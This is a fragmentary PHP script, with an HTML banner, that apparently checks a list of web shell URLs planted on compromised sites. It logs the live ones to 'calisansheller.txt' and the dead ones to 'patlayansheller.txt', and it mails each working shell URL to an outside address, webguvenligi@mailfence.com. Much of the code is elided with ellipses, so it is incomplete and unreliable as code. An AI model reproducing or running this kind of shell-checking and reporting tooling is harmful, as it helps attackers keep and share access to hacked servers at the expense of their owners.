...
<font face='Ubuntu'>
<center><img class='image' src='https://townsquare.media/site/846/files/2018/10/xasthur.jpg?w=980&q=75' width='220' height='220'>
<p>
<body bgcolor='black'>
...
function get_http_response_code($theurl) {
    ...
    if ($status == 200) {
        ...
        $body = "shell: $theurl";
        if (!empty($theurl)) {
@mail("webguvenligi@mailfence.com", $judul, $body);
        }
        $writeuRl = $theurl . "
";
        $fh = fopen("calisansheller.txt", "a");
        ...
        $writeuRl = $theurl . "
";
        $fh = fopen("patlayansheller.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
